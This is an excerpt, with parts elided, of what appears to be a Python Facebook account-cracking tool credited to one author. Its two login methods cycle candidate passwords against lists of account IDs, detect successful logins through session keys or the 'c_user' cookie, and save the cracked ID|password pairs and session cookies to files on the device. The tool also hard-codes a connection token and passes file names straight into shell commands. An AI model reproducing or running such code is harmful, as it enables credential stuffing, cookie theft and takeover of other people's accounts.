#Original written By hridoy khan
...
\033[1;37m Facebook:            md hridoy khan 

\033[1;37m Github  :            hridoykhan

\033[1;37m Version :            19.7
...
def result(OKs,cps):
    ...
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back hk Menu ")
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        ...
        try:
            ...
            sys.stdout.write(f"\r {h}[hk] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [hk-OK] {sid} | {ps} {S}")

                    oks.append(sid)

                    open('/sdcard/hk_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/hk_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')

                    break

                elif 'www.facebook.com' in q['error']['message']:

                    #  print(f"\r{A} [hk-CP] {sid} | {ps} {S}")
    ...
    def methodB(self, sid, name, psw):
        ...
        try:
            ...
            sys.stdout.write(f"\r {h}[hk] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    open('/sdcard/hk_OK.txt','a').write(sid+'|'+ps+'\n')
                    ...
                    open('/sdcard/hk_CP.txt','a').write(sid+'|'+ps+'\n')
...
def cutter():
    ...
    os.system('touch ' +hridoy)

    os.system('sort -r '+hk+' | uniq > '+hridoy)

    os.system('clear')

    print(logo)

    print("Removed Successful From File: " + hk )

    print("New File Saved:" + sarfraz )

    print(47*'-')

    input(f"{h} Press Enter To Back hk Menu ")
